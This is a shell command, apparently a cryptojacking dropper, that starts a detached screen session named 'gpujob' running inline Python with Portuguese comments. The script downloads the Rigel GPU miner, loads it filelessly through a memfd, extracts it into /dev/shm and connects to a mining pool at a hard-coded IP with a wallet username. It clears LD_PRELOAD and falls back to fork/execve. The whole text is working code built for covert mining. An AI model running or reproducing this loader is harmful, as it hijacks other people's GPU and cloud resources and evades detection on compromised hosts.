screen -dmS gpujob python3 -c '
import os
import ctypes
import requests
import tempfile
import subprocess
from ctypes import CDLL, get_errno

MINER_URL = "https://github.com/rigelminer/rigel/releases/download/1.21.2/rigel-1.21.2-linux.tar.gz"

libc = CDLL(None)

def create_memfd():
    MFD_CLOEXEC = 0x0001
    fd = libc.syscall(319, b"anon_memfd", MFD_CLOEXEC)
    if fd == -1:
        raise OSError(get_errno())
    return fd

def download_and_load_miner():
    response = requests.get(MINER_URL, stream=True)
    response.raise_for_status()
    fd = create_memfd()
    for chunk in response.iter_content(chunk_size=8192):
        os.write(fd, chunk)
    os.lseek(fd, 0, os.SEEK_SET)
    return fd

def execute_miner(fd):
    with tempfile.TemporaryDirectory(dir="/dev/shm") as tmpdir:
        os.chdir(tmpdir)
        
        # Extrair o arquivo
        tar_cmd = ["/bin/tar", "xzf", f"/proc/self/fd/{fd}", "-C", tmpdir]
        subprocess.run(tar_cmd, check=True, pass_fds=[fd])
        
        # Procurar pelo executável
        miner_bin = None
        for root, dirs, files in os.walk(tmpdir):
            for file in files:
                file_path = os.path.join(root, file)
                if os.access(file_path, os.X_OK) and ("rigel" in file.lower()):
                    miner_bin = file_path
                    os.chmod(miner_bin, 0o755)
                    break
            if miner_bin: break
        
        if not miner_bin:
            raise FileNotFoundError("Binário rigel não encontrado!")
        
        # Configurar argumentos
        args = [
            miner_bin,
            "--algorithm", "octopus",
            "--url", "stratum+ssl://18.221.157.241:8443",
            "--username", "krxY97WV2D.CLD",
            "--password", "x",
            "--no-strict-ssl"
        ]
        
        print(f"Iniciando: {' '.join(args)}")
        env = os.environ.copy()
        env["LD_PRELOAD"] = ""
        
        try:
            subprocess.run(args, env=env, check=True)
        except subprocess.CalledProcessError as e:
            print(f"Erro: {e}")
            # Tentar com fork se falhar
            pid = os.fork()
            if pid == 0:
                os.close(fd)
                os.execve(miner_bin, args, env)
            else:
                os.waitpid(pid, 0)

if __name__ == "__main__":
    try:
        print("=== Iniciando minerador ===")
        fd = download_and_load_miner()
        execute_miner(fd)
    except Exception as e:
        print(f"ERRO CRÍTICO: {e}")
    finally:
        try: os.close(fd)
        except: pass
    print("=== Processo finalizado ===")
'
